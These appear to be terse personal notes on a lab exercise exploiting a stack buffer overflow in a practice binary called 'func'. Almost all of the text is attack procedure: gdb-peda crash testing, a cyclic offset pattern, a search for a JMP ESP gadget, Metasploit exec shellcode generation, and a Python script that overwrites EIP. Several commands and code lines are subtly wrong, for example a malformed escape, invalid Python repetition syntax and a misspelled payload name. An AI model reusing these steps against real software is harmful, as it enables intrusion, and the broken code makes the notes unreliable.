PART 1:

chmod +x func
./func
./func
gdb ./func 

gdb-peda$
pdisass main

EX. call 0x3d0 <gets@plt> 
pdisass gets (disassembles gets func)

run 
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
(CRASH)

run <<<$(echo"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
run <<<$(./mybuff.py)



PART 2:

env - gdb ./func
disassemble getuserinput
show env
unset env LINES
unset env COLUMNS
run
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (CRASH)
info proc map
find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 (0xff = JMP in hex)
SYNTAX:  ^start of stack AFTER HEAP LINE ^END OF STACK ^JMP ^0xe4 in hex

TAKE TOP 3  HEX and convert to little indian




Add to mybuff.py
'''
0xf7de3b59 -> \x\x59\x3b\xde\xf7 JMP ESP  (this
0xf7f588ab
0xf7f645fb
'''


lin ops > msfdb init
        > msfconsole
              > use payload/linux/x86/exec
              > show options 
              > set CMD 'whoami && ifconfig'
              > show options
              > generate -b '\x00' -f python (\x00 is getting rid of null bytes, which can fuck up our payload)
              copy the hex paragraph on the bottom of the page and take to script under OVERWRITE EIP REGISTER              
              > 
                  #!/usr/bin/python2.7
                  
                  #Fill Buffer
                  
                  buf = "A" * 62
                  
                  #Overwrite EIP REGISTER
                  buf += "\x59\x3b\xde\xf7"
                  buf += "\x90" x 10
                  
                  print(buf)
              


> ./func <<<$(mybuff.py)
> msfvenom -l pinux/x86/exec CMD='whoami && ifconfig' -b '\x00' -f python
